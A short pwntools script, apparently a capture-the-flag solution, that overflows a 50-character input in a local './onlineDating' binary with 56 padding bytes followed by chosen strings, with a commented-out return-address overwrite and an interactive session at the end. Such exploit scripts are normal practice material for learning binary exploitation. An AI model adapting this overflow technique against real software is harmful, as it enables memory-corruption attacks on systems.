from pwn import * 

msg = b"A"*56 + b"Gerard_Pique" + b"Clara_C." + b"TwingoOo" + b"CasioOo!"
'''
msg2 = p64(0xaddress)
buffer = b"3" + b"A"*56 + msg2 
'''
p = process("./onlineDating")
#msgin = p.sendline(msg) 
msgin = p.sendlineafter(b"Please tell us how to update it (max 50 char):", msg)

msgout = p.recvall()

print(msgout)

p.interactive()


